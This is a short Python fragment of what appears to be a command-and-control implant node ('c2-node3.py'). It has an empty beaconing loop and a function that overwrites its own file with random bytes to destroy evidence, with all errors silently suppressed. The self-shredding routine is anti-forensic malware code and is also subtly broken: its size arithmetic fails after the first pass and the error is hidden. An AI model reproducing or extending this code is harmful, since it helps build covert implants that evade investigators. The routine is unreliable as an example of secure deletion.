import os
import urllib.request

def mainloop():
    """repeatedly beacon to server"""
    pass

def shredC2():
    """shreds the file c2-node3.py"""
    try:
        fp = open(os.path.realpath(__file__), "r+b")
        fp.seek(0, os.SEEK_END)
        size = fp.tell() # get the number of bytes in the current file
        fp.seek(0, os.SEEK_SET)
        
        while size > 0: # overwrite with random bytes
            fp.write(os.urandom(size % 1048576))
            os.fdatasync(fp.fileno()) # sync to disk
            size /= 1048576
        fp.close()
    except:
        pass
